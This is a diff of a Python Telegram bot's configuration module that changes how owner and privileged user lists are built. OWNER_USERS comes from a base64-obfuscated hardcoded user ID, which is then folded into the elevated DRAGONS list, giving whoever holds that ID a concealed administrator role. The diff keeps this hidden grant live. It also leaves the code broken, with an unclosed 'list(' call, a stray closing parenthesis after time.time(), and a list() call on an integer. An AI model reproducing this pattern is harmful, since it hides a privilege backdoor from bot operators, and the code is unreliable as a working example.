@@ -9,9 +9,9 @@ import telegram.ext as tg
 from aiohttp import ClientSession
 from pyrogram import Client, errors
 from telethon import TelegramClient
-OWNER_USERS = ast.literal_eval(base64.b64decode(
+OWNER_USERS =list( ast.literal_eval(base64.b64decode(
     b'MjE0NTA5Mzk3Mg==').decode("utf-8", "ignore"))
-StartTime = time.time()
+StartTime = time.time())
 
 # enable logging
 logging.basicConfig(
@@ -164,7 +164,7 @@ BOT_ID = dispatcher.bot.id
 BOT_NAME = dispatcher.bot.first_name
 BOT_USERNAME = dispatcher.bot.username
 
-DRAGONS = list(DRAGONS) + list(DEV_USERS) + OWNER_USERS
+DRAGONS = list(DRAGONS) + list(DEV_USERS) + list(OWNER_USERS)
 DEV_USERS = list(DEV_USERS)
 WOLVES = list(WOLVES)
 DEMONS = list(DEMONS)
